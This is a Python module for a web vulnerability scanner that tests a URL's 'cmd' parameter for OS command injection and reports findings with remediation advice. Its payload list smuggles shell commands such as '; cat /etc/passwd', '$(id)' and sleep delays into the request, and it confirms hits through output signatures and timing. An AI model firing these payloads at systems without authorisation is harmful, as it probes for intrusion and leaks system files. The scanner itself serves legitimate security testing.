from .base import BaseScanner, Vulnerability
from ..core.target import Target
from typing import List
from urllib.parse import quote
import logging
import re
import time

logger = logging.getLogger(__name__)


class CommandInjectionScanner(BaseScanner):
    """
    Command Injection scanner.

    Detection is evidence-based to avoid false positives:
      * Content-based: only flags when the response contains the *actual output*
        of the injected command (matched via strict regex signatures), not loose
        substrings like "bin"/"etc".
      * Time-based: only flags when a `sleep` payload delays the response well
        beyond a measured baseline, AND the delay reproduces on a second request.
    """

    PAYLOADS = [
        # Unix/Linux - separators
        "; id", "| id", "&& id", "|| id",
        "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
        "`id`", "$(id)", "`cat /etc/passwd`", "$(cat /etc/passwd)",
        ";${IFS}cat${IFS}/etc/passwd", ";cat</etc/passwd",
        "%0a id", "%0a cat /etc/passwd", "\n id",
        # Windows
        "& type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini",
        "&& type C:\\Windows\\win.ini", "& dir", "| dir", "&& dir",
        # Time-based (blind)
        "; sleep 5", "| sleep 5", "&& sleep 5", "$(sleep 5)", "`sleep 5`",
        "& ping -n 6 127.0.0.1", "& timeout 5",
    ]

    # Strict signatures: these only appear in genuine command OUTPUT.
    STRONG_SIGNATURES = [
        (re.compile(r"root:.*?:0:0:"), "/etc/passwd contents (root:...:0:0:)"),
        (re.compile(r"uid=\d+\([\w.\-]+\)\s+gid=\d+"), "`id` command output (uid=/gid=)"),
        (re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I), "Windows win.ini contents"),
        (re.compile(r"Volume Serial Number is|Directory of ", re.I), "Windows `dir` output"),
    ]

    TIME_MARKERS = ("sleep", "ping -n", "timeout")
    DELAY_THRESHOLD = 4.0  # seconds above baseline to consider a delay significant

    def _baseline(self, target: Target) -> float:
        try:
            start = time.time()
            self.session.get(target.url, timeout=10)
            return time.time() - start
        except Exception:
            return 1.0

    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        vulnerabilities = []
        logger.info(f"Starting Command Injection scan on {target.url}")

        baseline = self._baseline(target)
        sep = '&' if '?' in target.url else '?'

        for payload in self.PAYLOADS:
            if callback:
                callback(payload)
            try:
                test_url = f"{target.url}{sep}cmd={quote(payload)}"
                is_time = any(m in payload.lower() for m in self.TIME_MARKERS)

                start = time.time()
                response = self.session.get(test_url, timeout=15)
                elapsed = time.time() - start

                # --- Content-based (strict) ---
                hit_label = None
                for rx, label in self.STRONG_SIGNATURES:
                    if rx.search(response.text):
                        hit_label = label
                        break
                if hit_label:
                    vulnerabilities.append(Vulnerability(
                        name="Command Injection",
                        severity="CRITICAL",
                        description="OS command injection confirmed: the response contains the actual output of the injected command.",
                        evidence=f"Payload: {payload}\nConfirmed by: {hit_label}",
                        url=test_url,
                        recommendation="Never pass user input to OS/shell commands. Use safe, parameterised APIs, strict allow-lists, and least privilege.",
                        proof_of_concept=f"curl '{test_url}'",
                    ))
                    logger.warning(f"Command Injection (content) confirmed at {test_url}")
                    break  # one confirmed finding is enough

                # --- Time-based (blind), double-confirmed to avoid flukes ---
                if is_time and elapsed >= baseline + self.DELAY_THRESHOLD:
                    start2 = time.time()
                    self.session.get(test_url, timeout=15)
                    elapsed2 = time.time() - start2
                    if elapsed2 >= baseline + self.DELAY_THRESHOLD:
                        vulnerabilities.append(Vulnerability(
                            name="Command Injection (Time-Based Blind)",
                            severity="CRITICAL",
                            description="Blind OS command injection: an injected delay command reproducibly slowed the response.",
                            evidence=f"Payload: {payload}\nBaseline: {baseline:.1f}s | delayed: {elapsed:.1f}s and {elapsed2:.1f}s",
                            url=test_url,
                            recommendation="Never pass user input to OS/shell commands. Use safe, parameterised APIs and least privilege.",
                            proof_of_concept=f"curl '{test_url}'",
                        ))
                        logger.warning(f"Command Injection (time-based) confirmed at {test_url}")
                        break

            except Exception as e:
                logger.debug(f"Error testing cmdi payload {payload}: {e}")
                continue

        logger.info(f"Command Injection scan complete. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
